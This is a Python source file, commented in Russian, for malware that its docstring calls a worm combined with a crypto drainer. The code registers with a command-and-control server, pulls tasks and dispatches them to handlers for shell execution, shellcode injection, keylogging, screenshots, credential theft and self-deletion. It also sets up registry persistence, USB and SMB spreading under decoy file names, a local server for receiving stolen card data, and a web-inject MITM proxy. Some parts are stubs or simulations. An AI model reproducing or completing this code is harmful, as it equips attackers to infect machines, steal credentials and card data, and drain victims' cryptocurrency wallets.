#!/usr/bin/env python3
"""
AutonomousAgent - Продвинутый модуль, объединяющий функционал червя и криптодрейнера
для автоматического обнаружения, распространения и монетизации.
"""

import os
import sys
import time
import json
import random
import logging
import threading
import ipaddress
import socket
import platform
import requests
import uuid
import queue
import subprocess
import ctypes
from typing import Dict, List, Any, Optional, Tuple, Set, Union
import base64
import io

# Импортируем основные модули
from src.worm.worm_core import WormCore
from src.worm.propagation import PropagationEngine
from src.modules.web3_drainer import Web3Drainer, MEVDrainer
from src.vulnerability_scanner import VulnerabilityScanner
from src.exploit_engine import ExploitEngine
from src.exploit_manager import ExploitManager
from src.steganography import Steganography
from src.modules.icmp_tunnel import ICMPTunnel
from src.modules.persistence import PersistenceManager
from src.modules.worm import PropagationEngine
from src.modules.webinject import MitmProxy, load_inject_templates
# from worm import WormholePropagator # Закомментировано - неизвестный модуль
# from payload import PayloadManager # Комментируем, так как модуля нет
# from comms.comms import C2Communicator # Комментируем

# Добавляем импорты для HTTP сервера и скриншотов
from http.server import BaseHTTPRequestHandler, HTTPServer
import mss
import mss.tools

# Импорт модуля кардинга
from src.modules.carding_worker import CardingWorker, CardingWorkerInterface

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='autonomous_agent.log'
)
logger = logging.getLogger('AutonomousAgent')

# --- Утилиты --- 
def is_admin_windows() -> bool:
    """Проверяет, запущен ли процесс с правами администратора на Windows."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        # Не Windows или нет shell32
        return False
    except Exception as e:
         logger.error(f"Error checking admin privileges on Windows: {e}")
         return False
# --- Конец утилит --- 

# --- HTTP Handler для приема данных от кардера ---
class AgentHTTPRequestHandler(BaseHTTPRequestHandler):
    agent_ref = None # Ссылка на экземпляр AutonomousAgent

    def do_POST(self):
        # Обрабатываем только запросы от carding worker
        if self.path == '/submit_carding_data':
            if not AgentHTTPRequestHandler.agent_ref or not AgentHTTPRequestHandler.agent_ref.carding_worker:
                self.send_error(503, "Carding worker not available")
                return
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                logger.debug(f"Agent HTTP Server received carding data: {post_data[:100]}...")

                # Передаем данные в CardingWorker для обработки
                AgentHTTPRequestHandler.agent_ref.carding_worker.process_incoming_data(post_data.decode('utf-8'))

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
            except Exception as e:
                logger.error(f"Error processing carding POST request: {e}")
                self.send_error(500, f"Internal server error: {e}")
        else:
            self.send_error(404, "Not Found")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def log_message(self, format, *args):
        # Можно перенаправить в основной логгер агента
        logger.debug(format % args)
# --- Конец HTTP Handler ---

class AutonomousAgent:
    """
    Автономный агент, интегрирующий функциональность червя и криптодрейнера
    для автоматического поиска, эксплуатации и монетизации уязвимостей
    """
    
    DEFAULT_CONFIG = { # <<< Конфигурация по умолчанию
            "log_level": "INFO",
            "c2_servers": ["http://localhost:8000"],
            "checkin_interval": 60,
            "checkin_jitter": 0.2,
            "worm": {
                 "enabled": True,
                 "scan_interval": 300,
                 "max_targets_per_run": 10,
                 "plugins": {
                      "usb_infector": {"enabled": True, "payload_name": "update.exe", "check_interval": 60},
                      "smb_scanner": {"enabled": True, "payload_name": "important_document.exe", "scan_timeout": 2, "check_interval": 600, "anonymous_only": True, "share_names": ["public", "share", "files", "documents"]}
                 }
            },
            "crypto": {
                 "enabled": False, # Отключено по умолчанию для безопасности
                 "receiver_addresses": {
                      "ethereum": "0xYOUR_ETH_ADDRESS_HERE",
                      "binance": "0xYOUR_BSC_ADDRESS_HERE"
                 },
                 "min_profit_threshold": 0.1
            },
            "persistence": {
                 "enabled": True, # Включено по умолчанию
                 "default_method": "registry" # или "cron"
            },
            "stealth": {
                 "enabled": False, # Отключено по умолчанию
                 "detect_sandboxes": True,
                 "detect_monitoring": True,
                 "adaptive_behavior": True
            },
            "carding": {
                 "enabled": True
            },
            "webinject": { # <<< Секция Webinject
                 "enabled": False, # Отключен по умолчанию
                 "mitm_port": 8080,
                 "target_domains": ["example.com", "test.org"], # Пример
                 "auto_start": False, # Не запускать прокси автоматически при старте агента
                 "install_ca": False # Не пытаться установить CA автоматически
            }
        }

    def __init__(self, config_file: Optional[str] = None):
        """
        Инициализация автономного агента
        
        Args:
            config_file: Путь к файлу конфигурации
        """
        self.logger = logger
        self.logger.info("Initializing AutonomousAgent")
        self.agent_id: Optional[str] = None
        self.agent_uuid = str(uuid.uuid4())
        self.executable_path = self._get_self_path()
        self.base_path = os.path.dirname(self.executable_path) if self.executable_path else "." # Базовый путь агента
        
        # Загружаем конфигурацию (с объединением)
        self.config = self._load_config(config_file)
        
        # Инициализируем основные компоненты
        self.persistence_manager = PersistenceManager()
        self.propagation_engine = PropagationEngine(
            agent_executable_path=self.executable_path,
            config=self.config.get('worm', {}) # <<< Передаем конфиг секции worm
        )
        self.carding_worker: Optional[CardingWorker] = None
        self.carding_interface: Optional[CardingWorkerInterface] = None
        if self.config.get('carding', {}).get('enabled', False): # <<< Проверяем enabled
             try:
                 # Передаем базовый путь агента
                 self.carding_worker = CardingWorker(agent_interface=None, base_path=self.base_path)
                 self.carding_interface = CardingWorkerInterface(worker=self.carding_worker, agent=self)
                 self.carding_worker.agent_interface = self.carding_interface
                 self.carding_worker.init()
                 logger.info("CardingWorker module initialized.")
             except Exception as e:
                 logger.error(f"Failed to initialize CardingWorker: {e}", exc_info=True)
                 self.carding_worker = None
                 self.carding_interface = None
        else:
             logger.info("CardingWorker module disabled by config.")

        # Инициализация Webinject
        self.webinject_engine: Optional[MitmProxy] = None
        if self.config.get('webinject', {}).get('enabled', False):
             try:
                 self.webinject_engine = MitmProxy(config=self.config.get('webinject', {}))
                 logger.info("Webinject (MITM) module initialized.")
                 # <<< Загружаем шаблоны при инициализации >>>
                 templates_dir = os.path.join(self.base_path, "src/modules/webinject/templates")
                 initial_templates = load_inject_templates(templates_dir)
                 if initial_templates:
                      self.webinject_engine.update_injects(initial_templates)
                 # <<< Конец загрузки шаблонов >>>
                 if self.config.get('webinject', {}).get('install_ca', False):
                      self.webinject_engine.install_ca_certificate()
             except Exception as e:
                 logger.error(f"Failed to initialize Webinject module: {e}", exc_info=True)
                 self.webinject_engine = None
        else:
             logger.info("Webinject module disabled by config.")

        self.web3_drainer = None
        self.mev_drainer = None
        if self.config.get('crypto', {}).get('enabled', False): # <<< Проверяем enabled
             try:
                 self.web3_drainer = Web3Drainer(log_level=self.config.get('log_level', 'INFO'))
                 self.mev_drainer = MEVDrainer(log_level=self.config.get('log_level', 'INFO'))
                 self._setup_crypto_drainer() # Настраиваем адреса и пороги
                 logger.info("Crypto modules (Web3Drainer, MEVDrainer) initialized.")
             except Exception as e:
                 logger.error(f"Failed to initialize crypto modules: {e}", exc_info=True)
                 self.web3_drainer = None
                 self.mev_drainer = None
        else:
             logger.info("Crypto modules disabled by config.")

        self.exploit_engine = ExploitEngine()
        self.vulnerability_scanner = VulnerabilityScanner()
        self.exploit_manager = ExploitManager()
        self.steganography = Steganography() if self.config.get('stegano_enabled', False) else None
        
        # Загрузка нативного модуля инъекции
        self.injector_lib = self._load_injector_library()
        
        # Очередь задач
        self.task_queue = queue.Queue()
        
        # Внутренние переменные
        self.running = False
        self.threads = []
        self.infected_hosts = set()
        self.victims_data = {}  # Данные о жертвах, включая криптокошельки
        self.mutex = threading.Lock()
        
        # Статистика
        self.stats = {
            "started_at": time.time(),
            "scanned_hosts": 0,
            "infected_hosts": 0,
            "detected_wallets": 0,
            "drained_wallets": 0,
            "total_drained_value": 0.0
        }
        
        # Инициализация HTTP сервера для кардера (если включен)
        self.http_server_thread: Optional[threading.Thread] = None
        self.http_server: Optional[HTTPServer] = None
        if self.carding_worker:
             AgentHTTPRequestHandler.agent_ref = self # Передаем ссылку на агента хендлеру
             # Запуск HTTP сервера будет в self.start()
        
        self.logger.info("AutonomousAgent initialized successfully")
    
    def _get_self_path(self) -> Optional[str]: # <<< Может вернуть None
        """Пытается определить путь к текущему исполняемому файлу/скрипту."""
        try:
            if getattr(sys, 'frozen', False):
                return sys.executable
            else:
                return os.path.abspath(__file__)
        except Exception as e:
             logger.error(f"Could not determine executable path: {e}")
             return None
    
    def _load_config(self, config_file: Optional[str]) -> Dict[str, Any]:
        """Загружает конфигурацию из файла, объединяя с дефолтной."""
        config = self.DEFAULT_CONFIG.copy() # Начинаем с дефолтной

        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    user_config = json.load(f)
                # Глубокое объединение словарей
                # TODO: Реализовать более надежное глубокое объединение
                def merge_dicts(base, new):
                    for k, v in new.items():
                        if isinstance(v, dict) and k in base and isinstance(base[k], dict):
                            merge_dicts(base[k], v)
                        else:
                            base[k] = v
                merge_dicts(config, user_config)
                logger.info(f"Loaded configuration from {config_file}")
            except json.JSONDecodeError as e:
                logger.error(f"Error decoding config file {config_file}: {e}. Using default config.")
            except Exception as e:
                logger.error(f"Error loading config file {config_file}: {e}. Using default config.", exc_info=True)
        else:
            logger.warning(f"Config file '{config_file}' not found or not specified. Using default configuration.")

        # Устанавливаем уровень логирования
        log_level_str = config.get('log_level', 'INFO').upper()
        log_level = getattr(logging, log_level_str, logging.INFO)
        logging.getLogger().setLevel(log_level) # Устанавливаем глобальный уровень
        self.logger.info(f"Log level set to {log_level_str}")

        return config
    
    def start(self):
        """Запускает автономный агент и все его компоненты."""
        self.logger.info("AutonomousAgent starting...") # <<< ДОБАВЛЕН ЛОГ
        if self.running:
            self.logger.warning("Agent is already running.")
            return
        
        self.running = True
        self.logger.info(f"Agent UUID: {self.agent_uuid}")
        self.logger.info(f"Running from: {self.executable_path}")
        self.logger.info(f"Base path: {self.base_path}")
        
        # Получаем информацию о системе
        system_info = self._get_system_info()
        self.logger.info(f"System Info: {json.dumps(system_info, indent=2)}")
        
        # <<< ДОБАВЛЕН ЛОГ >>>
        self.logger.info("Attempting initial C2 registration...")
        # Пытаемся зарегистрироваться на C2
        self._register_with_c2()
        
        # Если регистрация прошла успешно и persistence включен, устанавливаем его
        if self.agent_id and self.config.get('persistence', {}).get('enabled', False):
            self.logger.info("Attempting to establish persistence...")
            try:
                method = self.config.get('persistence', {}).get('default_method', 'registry')
                success, message = self.persistence_manager.ensure_persistence(
                     agent_path=self.executable_path,
                     method=method,
                     name="AutonomousAgentService" # Стандартное имя
                 )
                if success:
                    self.logger.info(f"Persistence established using method '{method}': {message}")
                else:
                    self.logger.warning(f"Failed to establish persistence using method '{method}': {message}")
            except Exception as e:
                 self.logger.error(f"Error during persistence setup: {e}", exc_info=True)

        # Запускаем фоновые потоки
        self._start_threads()
        
        # <<< Запускаем HTTP сервер для кардера, если он включен >>>
        if self.carding_worker:
             self.logger.info("Starting internal HTTP server for carding worker...")
             try:
                 AgentHTTPRequestHandler.agent_ref = self # Передаем ссылку на себя
                 # TODO: Порт должен быть настраиваемым?
                 self.http_server = HTTPServer(('0.0.0.0', 8888), AgentHTTPRequestHandler)
                 http_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
                 http_thread.start()
                 self.threads.append(http_thread)
                 self.logger.info("Internal HTTP server started on port 8888")
             except Exception as e:
                 self.logger.error(f"Failed to start internal HTTP server: {e}", exc_info=True)

        # <<< Автозапуск Webinject MITM proxy, если включен >>>
        if self.webinject_engine and self.config.get('webinject', {}).get('auto_start', False):
             webinject_cfg = self.config.get('webinject', {})
             mitm_port = webinject_cfg.get('mitm_port', 8080)
             target_domains = webinject_cfg.get('target_domains')
             self.logger.info(f"Auto-starting Webinject MITM proxy on port {mitm_port}...")
             success, error = self._handle_webinject_start(mitm_port, target_domains)
             if error:
                  self.logger.error(f"Failed to auto-start Webinject: {error}")

        self.logger.info("AutonomousAgent started successfully.")
    
    def stop(self):
        """Останавливает автономного агента"""
        if not self.running:
            return
            
        self.running = False
        self.logger.info("Stopping AutonomousAgent")
        
        # Останавливаем Webinject прокси
        if self.webinject_engine:
             self.webinject_engine.stop_proxy()
             # <<< Отключаем системный прокси при остановке >>>
             self._unset_system_proxy()
        
        # Останавливаем CardingWorker
        if self.carding_worker:
             self.carding_worker.stop()
        
        # Останавливаем движок распространения
        self.propagation_engine.stop()
        
        # Останавливаем HTTP сервер
        if self.http_server:
            self.http_server.shutdown()
            self.http_server.server_close()
        
        # Останавливаем потоки
        for thread in self.threads:
            if thread.is_alive():
                # Даем чуть больше времени, если это HTTP сервер
                timeout = 10 if thread is self.http_server_thread else 5
                thread.join(timeout=timeout)
        
        # Сигнализируем потокам о завершении
        self.task_queue.put(None) # Сигнал для _task_worker_loop
        
        self.logger.info("AutonomousAgent stopped")
    
    def _setup_crypto_drainer(self):
        """Настраивает криптодрейнер (если он включен)."""
        if not self.web3_drainer or not self.mev_drainer:
            return
        crypto_config = self.config.get('crypto', {})
        receiver_addresses = crypto_config.get('receiver_addresses', {})
        if not receiver_addresses or not any(receiver_addresses.values()):
             logger.warning("Crypto receiver addresses not configured. Crypto drainer functionality may be limited.")

        for chain, address in receiver_addresses.items():
            if address and "YOUR_" not in address: # Проверка, что адрес не дефолтный
                 try:
                     self.web3_drainer.set_receiver_address(chain, address)
                     logger.info(f"Set crypto receiver for {chain} to {address}")
                 except Exception as e:
                      logger.error(f"Failed to set receiver address for {chain}: {e}")
            else:
                 logger.warning(f"Receiver address for {chain} is not set or is default.")

        try:
             self.mev_drainer.set_profit_threshold(
                 float(crypto_config.get('min_profit_threshold', 0.1))
             )
        except ValueError as e:
              logger.error(f"Invalid min_profit_threshold in config: {e}")
    
    def _start_threads(self):
        """Запускает рабочие потоки"""
        # Поток для сканирования сетей
        network_scanner_thread = threading.Thread(
            target=self._network_scanner_loop,
            name="NetworkScanner"
        )
        network_scanner_thread.daemon = True
        self.threads.append(network_scanner_thread)
        network_scanner_thread.start()
        
        # Поток для поиска криптокошельков
        wallet_hunter_thread = threading.Thread(
            target=self._wallet_hunter_loop,
            name="WalletHunter"
        )
        wallet_hunter_thread.daemon = True
        self.threads.append(wallet_hunter_thread)
        wallet_hunter_thread.start()
        
        # Поток для дрейна обнаруженных кошельков
        crypto_drainer_thread = threading.Thread(
            target=self._crypto_drainer_loop,
            name="CryptoDrainer"
        )
        crypto_drainer_thread.daemon = True
        self.threads.append(crypto_drainer_thread)
        crypto_drainer_thread.start()
        
        # Поток для MEV-операций
        mev_thread = threading.Thread(
            target=self._mev_operations_loop,
            name="MEVOperations"
        )
        mev_thread.daemon = True
        self.threads.append(mev_thread)
        mev_thread.start()
        
        # Поток для check-in на C2
        checkin_thread = threading.Thread(
            target=self._checkin_loop,
            name="C2CheckIn"
        )
        checkin_thread.daemon = True
        self.threads.append(checkin_thread)
        checkin_thread.start()
        
        # Поток для обработки задач
        task_worker_thread = threading.Thread(
            target=self._task_worker_loop,
            name="TaskWorker"
        )
        task_worker_thread.daemon = True
        self.threads.append(task_worker_thread)
        task_worker_thread.start()
    
    def _network_scanner_loop(self):
        """Фоновый поток для сканирования сети и поиска целей."""
        self.logger.info("Starting network scanner loop")
        worm_config = self.config.get('worm', {})
        scan_interval = worm_config.get('scan_interval', 300)

        while self.running:
            if not worm_config.get('enabled', False):
                self.logger.debug("Worm module disabled, network scanner sleeping.")
                time.sleep(scan_interval)
                continue
            
            try:
                # TODO: Реализовать логику сканирования сети
                # self.propagation_engine должен иметь метод для поиска целей
                # Примерная логика:
                # targets = self.propagation_engine.scan_network(max_targets=10)
                # if targets:
                #    self.logger.info(f"Found potential targets: {targets}")
                #    # Добавить цели в очередь на обработку или сразу атаковать?
                #    for target in targets:
                #        self.task_queue.put({"type": "attack", "target": target})
                self.logger.debug("Network scan cycle completed (dummy implementation).")
                # Исправлена ошибка: у PropagationEngine нет метода autodetect_networks
                # Заменено на заглушку
                # networks = self.propagation_engine.autodetect_networks()
                # self.logger.info(f"Autodetected networks: {networks}")
                # for network in networks:
                #     self.propagation_engine.scan_network(network)
                pass # Убрать pass после реализации сканирования

            except AttributeError as e:
                 # Ловим конкретную ошибку, которую видели в логах
                 self.logger.error(f"AttributeError in network scanner (likely missing method): {e}")
            except Exception as e:
                self.logger.error(f"Error in network scanner: {e}", exc_info=True)
            
            time.sleep(scan_interval + random.uniform(0, scan_interval * 0.1))
    
    def _wallet_hunter_loop(self):
        """Поиск криптокошельков на зараженных машинах"""
        self.logger.info("Starting wallet hunter loop")
        
        while self.running:
            try:
                # Обрабатываем только новые зараженные хосты
                with self.mutex:
                    hosts_to_process = self.infected_hosts.copy()
                
                for host in hosts_to_process:
                    if not self.running:
                        break
                        
                    # Пропускаем хосты, которые уже обработаны
                    if host in self.victims_data:
                        continue
                    
                    self.logger.info(f"Hunting for crypto wallets on {host}")
                    
                    # Здесь должна быть логика поиска криптокошельков
                    # В рамках PoC просто симулируем нахождение кошельков
                    wallets = self._simulate_wallet_search(host)
                    
                    if wallets:
                        with self.mutex:
                            self.victims_data[host] = wallets
                            self.stats["detected_wallets"] += len(wallets)
                            self.logger.info(f"Found {len(wallets)} wallets on {host}")
                
                # Задержка между циклами
                time.sleep(120)
                
            except Exception as e:
                self.logger.error(f"Error in wallet hunter: {e}")
                time.sleep(60)
    
    def _simulate_wallet_search(self, host: str) -> List[Dict[str, Any]]:
        """
        Симулирует поиск криптокошельков (для демонстрации)
        
        Args:
            host: IP-адрес хоста
            
        Returns:
            List[Dict]: Найденные кошельки
        """
        # В реальном коде здесь было бы фактическое сканирование системы
        wallets = []
        
        # Случайное количество кошельков (0-3)
        wallet_count = random.randint(0, 3)
        
        for _ in range(wallet_count):
            wallet_type = random.choice(["ethereum", "binance", "bitcoin"])
            
            # Генерируем фейковый приватный ключ
            private_key = ''.join(random.choice('0123456789abcdef') for _ in range(64))
            
            wallets.append({
                "type": wallet_type,
                "private_key": private_key,
                "drained": False
            })
        
        return wallets
    
    def _crypto_drainer_loop(self):
        """Фоновый поток для операций криптодрейнера."""
        self.logger.info("Starting crypto drainer loop")
        crypto_config = self.config.get('crypto', {})
        scan_interval = crypto_config.get('drain_interval', 900) # Интервал проверки

        while self.running:
            # Проверяем, включен ли модуль и инициализирован ли дренер
            if not crypto_config.get('enabled', False) or not self.web3_drainer:
                self.logger.debug("Crypto drainer disabled or not initialized, sleeping.")
                time.sleep(scan_interval)
                continue
                
            try:
                self.logger.debug("Running crypto drainer cycle...")
                # TODO: Добавить логику поиска и опустошения кошельков
                # detected_wallets = self.web3_drainer.find_wallets()
                # if detected_wallets:
                #     self.logger.info(f"Found wallets: {len(detected_wallets)}")
                #     for wallet in detected_wallets:
                #         success, value = self.web3_drainer.drain_wallet(wallet)
                #         if success:
                #             self.logger.info(f"Drained wallet {wallet.get('address')} for {value}")
                pass # Убрать pass после реализации
            except Exception as e:
                self.logger.error(f"Error in crypto drainer loop: {e}", exc_info=True)
            
            time.sleep(scan_interval + random.uniform(0, scan_interval * 0.1))
            
    def _mev_operations_loop(self):
        """Фоновый поток для выполнения MEV-операций."""
        self.logger.info("Starting MEV operations loop")
        crypto_config = self.config.get('crypto', {})
        mev_interval = crypto_config.get('mev_interval', 1800)

        while self.running:
            # Проверяем, включен ли модуль и инициализирован ли MEV дренер
            if not crypto_config.get('enabled', False) or not self.mev_drainer:
                self.logger.debug("MEV drainer disabled or not initialized, sleeping.")
                time.sleep(mev_interval)
                continue
                
            try:
                self.logger.debug("Running MEV operations cycle...")
                # Добавляем проверку перед использованием self.mev_drainer
                # if self.mev_drainer:
                    # TODO: Добавить реальную MEV логику
                    # private_key = "..." # Где-то нужно получить приватный ключ
                    # self.mev_drainer.add_private_key(private_key)
                    # opportunities = self.mev_drainer.scan_for_opportunities()
                    # if opportunities:
                    #     self.mev_drainer.execute_mev_strategy(opportunities[0])
                pass # Убрать pass после реализации
            except AttributeError as e:
                # Перехватываем ошибку, если mev_drainer все же оказался None (маловероятно с проверкой выше)
                self.logger.error(f"AttributeError in MEV loop (MEVDrainer likely None): {e}")
            except Exception as e:
                self.logger.error(f"Error in MEV operations loop: {e}", exc_info=True)

            time.sleep(mev_interval + random.uniform(0, mev_interval * 0.1))
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Возвращает текущую статистику работы агента
        
        Returns:
            Dict: Статистика работы
        """
        with self.mutex:
            stats = self.stats.copy()
            stats["runtime"] = time.time() - stats["started_at"]
            stats["runtime_readable"] = self._format_time(stats["runtime"])
        
        return stats
    
    def _format_time(self, seconds: float) -> str:
        """
        Форматирует время в человекочитаемый вид
        
        Args:
            seconds: Время в секундах
            
        Returns:
            str: Отформатированное время
        """
        minutes, seconds = divmod(int(seconds), 60)
        hours, minutes = divmod(minutes, 60)
        days, hours = divmod(hours, 24)
        
        parts = []
        if days > 0:
            parts.append(f"{days}d")
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        parts.append(f"{seconds}s")
        
        return " ".join(parts)

    def _get_system_info(self) -> Dict[str, Any]:
        """Собирает детальную информацию о системе."""
        info = {
            "agent_uuid": self.agent_uuid,
            "hostname": "unknown",
            "internal_ip": "unknown",
            "external_ip": "unknown",
            "os": platform.system(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
            "user": "unknown",
        }
        try:
            info["hostname"] = socket.gethostname()
        except Exception as e:
            self.logger.warning(f"Could not get hostname: {e}")

        try:
            # Попытка получить внутренний IP (может быть неточной)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.1) # Не блокировать надолго
            try:
                # Не обязательно подключится, но ОС выберет подходящий интерфейс
                s.connect(('10.255.255.255', 1))
                info["internal_ip"] = s.getsockname()[0]
            except Exception:
                 # Пробуем старый метод, если первый не сработал
                 try:
                     info["internal_ip"] = socket.gethostbyname(info["hostname"])
                 except socket.gaierror:
                      self.logger.warning("Could not resolve internal IP via hostname.")
            finally:
                s.close()
        except Exception as e:
            self.logger.warning(f"Could not get internal IP: {e}")

        try:
            # Попытка получить внешний IP
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            response.raise_for_status() # Проверка на HTTP ошибки
            info["external_ip"] = response.json().get("ip", "unknown")
        except requests.RequestException as e:
            self.logger.warning(f"Could not get external IP: {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error getting external IP: {e}")


        try:
            # os.getlogin() может вызвать ошибку, если нет контролирующего терминала
            info["user"] = os.getlogin()
        except OSError:
             try:
                 # Альтернативный метод для *nix
                 import pwd
                 info["user"] = pwd.getpwuid(os.getuid()).pw_name
             except (ImportError, KeyError):
                 # Альтернативный метод для Windows
                 info["user"] = os.environ.get("USERNAME", "unknown")
        except Exception as e:
            self.logger.warning(f"Could not get username: {e}")

        return info

    def _register_with_c2(self):
        """Попытка регистрации агента на одном из C2 серверов."""
        system_info = self._get_system_info()
        # Добавляем уникальный UUID агента
        system_info['agent_uuid'] = self.agent_uuid

        # <<< Получаем C2 из переменных окружения или конфига >>>
        c2_host = os.environ.get('C2_HOST')
        c2_port = os.environ.get('C2_PORT')
        c2_servers_from_env = []
        if c2_host and c2_port:
            # Предполагаем HTTP, если протокол не указан в C2_HOST
            scheme = "http" if not c2_host.startswith(("http://", "https://")) else ""
            if scheme:
                 c2_url_base = f"{scheme}://{c2_host}:{c2_port}"
            else:
                 c2_url_base = f"{c2_host}:{c2_port}" # Если протокол уже есть
            c2_servers_from_env.append(c2_url_base)
            logger.info(f"Using C2 server from environment variables: {c2_url_base}")
        else:
             logger.warning("C2_HOST or C2_PORT environment variables not set. Falling back to config file.")

        c2_servers_from_config = self.config.get('c2_servers', [])
        c2_servers = c2_servers_from_env or c2_servers_from_config # Приоритет у переменных окружения

        if not c2_servers:
            logger.warning("No C2 servers configured.")
            return False # Возвращаем False, если нет серверов C2

        # Перемешиваем список C2 для балансировки нагрузки (если их несколько)
        if len(c2_servers) > 1:
             random.shuffle(c2_servers)

        registration_success = False
        for c2_url_base in c2_servers:
            register_url = f"{c2_url_base}/agents/register"
            try:
                logger.info(f"Registering with C2: {register_url}")
                # Устанавливаем connect timeout и read timeout
                response = requests.post(register_url, json=system_info, timeout=(5, 10)) # 5 сек на коннект, 10 на чтение
                response.raise_for_status() # Проверяем на ошибки HTTP

                result = response.json()
                if result.get('status') == 'success':
                    self.agent_id = result.get('agent_id') # Сохраняем ID, выданный C2
                    logger.info(f"Successfully registered with C2 server {c2_url_base}. Agent ID: {self.agent_id}")
                    registration_success = True
                    break # Выходим из цикла при успехе
                else:
                    logger.warning(f"Registration failed on {c2_url_base}: {result.get('message', 'Unknown error')}")

            except requests.exceptions.ConnectionError as e:
                 # Используем f-string для форматирования
                 logger.error(f"Connection error registering with C2 server {register_url}: {e}")
            except requests.exceptions.Timeout as e:
                logger.warning(f"Timeout registering with C2 server {register_url}: {e}")
            except requests.exceptions.RequestException as e:
                 # Используем f-string
                 logger.error(f"Error registering with C2 server {register_url}: {e}")

        if not registration_success:
            logger.warning("Failed to register with any C2 server.")

        return registration_success # Возвращаем статус регистрации

    def _checkin_loop(self):
        """Периодически отправляет check-in на C2 сервер и получает задачи."""
        if not self.agent_id:
            self.logger.warning("Cannot start check-in loop: Agent not registered.")
            # Попытка повторной регистрации через некоторое время
            time.sleep(self.config.get("checkin_interval", 60))
            self._register_with_c2()
            if not self.agent_id: return # Выход, если регистрация снова не удалась

        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}")
        checkin_url = f"{c2_url_base}/agents/{self.agent_id}/checkin"

        while self.running:
            interval = self.config.get("checkin_interval", 60)
            jitter = self.config.get("checkin_jitter", 0.2)
            sleep_time = interval + random.uniform(-interval * jitter, interval * jitter)

            try:
                # Отправляем check-in
                payload = {
                    "timestamp": time.time(),
                    "status": "active", # Можно добавить больше статусной информации
                     # TODO: Добавить краткую статистику, нагрузку и т.д.
                }
                response = requests.post(checkin_url, json=payload, timeout=10)
                response.raise_for_status()
                tasks = response.json().get("tasks", []) # Получаем задачи от C2

                if tasks:
                    self.logger.info(f"Received {len(tasks)} new tasks from C2.")
                    for task in tasks:
                        self.task_queue.put(task) # Помещаем задачи в очередь

            except requests.RequestException as e:
                self.logger.error(f"Failed to check-in with C2 server {checkin_url}: {e}")
            except Exception as e:
                 self.logger.error(f"Unexpected error during check-in: {e}")

            time.sleep(sleep_time)

    def _task_worker_loop(self):
        """Основной цикл обработки задач из очереди."""
        while self.running:
            try:
                # Ожидаем задачу из очереди
                task = self.task_queue.get(timeout=1.0) # Таймаут для проверки self.running
                if task is None: # Сигнал завершения
                    break
                if not self.running: # Дополнительная проверка
                    break

                task_id = task.get('task_id')
                # Обрабатываем задачу
                result, error = self._handle_task(task)
                # Отправляем результат на C2
                self._send_task_result(task_id, result, error)

            except queue.Empty:
                continue # Таймаут, проверяем self.running и ждем дальше
            except Exception as e:
                logger.error(f"Error in task worker loop: {e}", exc_info=True)
                # Пауза после ошибки
                time.sleep(5)
        logger.info("Task worker loop finished.")

    def _handle_task(self, task: Dict[str, Any]) -> Tuple[Any, Optional[str]]:
        """Обрабатывает задачу, полученную от C2."""
        command = task.get('command')
        params = task.get('params', {})
        task_id = task.get('task_id')
        self.logger.info(f"Handling task {task_id}: Command={command}, Params={params}")

        handler_map = {
            CommandType.EXECUTE_SHELL.value: lambda p: self._handle_shell_command(p.get('command_line'), p.get('timeout')),
            CommandType.GET_SYSTEM_INFO.value: lambda p: self._get_system_info(),
            CommandType.INJECT_SHELLCODE.value: lambda p: self._handle_inject_shellcode(p.get('target_process'), p.get('shellcode_b64')),
            CommandType.START_KEYLOGGER.value: lambda p: self._handle_keylogger_start(),
            CommandType.STOP_KEYLOGGER.value: lambda p: self._handle_keylogger_stop(),
            CommandType.GET_KEYLOGS.value: lambda p: self._handle_keylogger_get_logs(),
            CommandType.SCREENSHOT.value: lambda p: self._handle_screenshot(),
            CommandType.STEAL_CREDENTIALS.value: lambda p: self._handle_steal_credentials(),
            CommandType.SCAN_FILES.value: lambda p: self._handle_scan_files(p.get('start_path'), p.get('masks'), p.get('max_depth')),
            CommandType.FIND_APP_SESSIONS.value: lambda p: self._handle_find_app_sessions(p.get('app_names')),
            CommandType.PERSIST.value: lambda p: self._handle_persist(p.get('method'), p.get('name'), p.get('path'), p.get('args')),
            CommandType.SELF_DELETE.value: lambda p: self._handle_self_delete(self.executable_path),
            'WEBINJECT_START': lambda p: self._handle_webinject_start(p.get('port'), p.get('domains')),
            'WEBINJECT_STOP': lambda p: self._handle_webinject_stop(),
            'WEBINJECT_UPDATE': lambda p: self._handle_webinject_update(p.get('templates')),
            'WEBINJECT_INSTALL_CA': lambda p: self._handle_webinject_install_ca(),
            'SET_SYSTEM_PROXY': lambda p: self._handle_set_system_proxy(p.get('host'), p.get('port'), p.get('enabled'))
        }

        if command in handler_map:
            try:
                # Передаем параметры в обработчик
                result, error = handler_map[command](params if params else {}) # Передаем пустой dict, если params нет
                self.logger.info(f"Task {task_id} ({command}) completed. Error: {error}")
                return result, error
            except Exception as e:
                self.logger.error(f"Error executing task {task_id} ({command}): {e}", exc_info=True)
                return None, f"Agent execution error: {e}"
        else:
            self.logger.warning(f"Unknown command received: {command}")
            return None, f"Unknown command: {command}"

    def _handle_shell_command(self, command_line: str, timeout: Optional[int]) -> Tuple[Any, Optional[str]]:
        # ... existing shell command handler ...
        pass # Placeholder

